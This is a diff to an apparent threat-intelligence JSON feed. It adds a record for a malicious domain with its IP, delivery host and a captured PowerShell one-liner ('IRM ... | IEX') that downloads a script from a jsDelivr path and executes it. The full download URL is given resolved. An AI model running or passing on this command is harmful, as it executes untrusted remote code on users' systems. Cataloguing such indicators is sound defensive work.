@@ -101,5 +101,22 @@
     ],
     "ReportId": "cmwfqf7a40ivv0oml8u89k1od",
     "ScannedAt": "2026-11-14T01:33:36.554000+00:00"
+  },
+  {
+    "UrlDomain": "ustkanrdk.ru",
+    "DeliveryUrl": [
+      "fastly.jsdelivr.net"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "91.236.136.63"
+    ],
+    "Related": [],
+    "Payload": "IRM fastly[.]jsdelivr[.]net/g\"h\"/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa | IEX",
+    "ResolvedDownloadUrl": [
+      "https://fastly.jsdelivr.net/gh/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa"
+    ],
+    "ReportId": "cmwg9lbgo0l4u0omlslp8xa75",
+    "ScannedAt": "2026-11-14T10:30:14.635000+00:00"
   }
 ]
